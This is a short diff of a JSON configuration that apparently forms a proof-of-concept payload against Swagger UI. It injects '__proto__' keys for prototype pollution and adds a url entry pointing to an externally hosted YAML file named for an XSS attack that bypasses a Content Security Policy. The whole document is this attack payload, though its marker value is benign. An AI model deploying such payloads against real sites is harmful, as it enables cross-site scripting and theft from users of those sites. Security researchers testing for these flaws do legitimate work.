@@ -4,7 +4,8 @@
     "queryConfigEnabled": 1,
     "__proto__":{"scun":"Hello"},
     "urls": [
-        {
+        { 
+        "__proto__":{"scun":"Hello"},
         "url": "https://ltidi2000.github.io/xsshuner_ltidi/swaggerxssbypasscsp.yaml",
         "name": "Foo"
         }
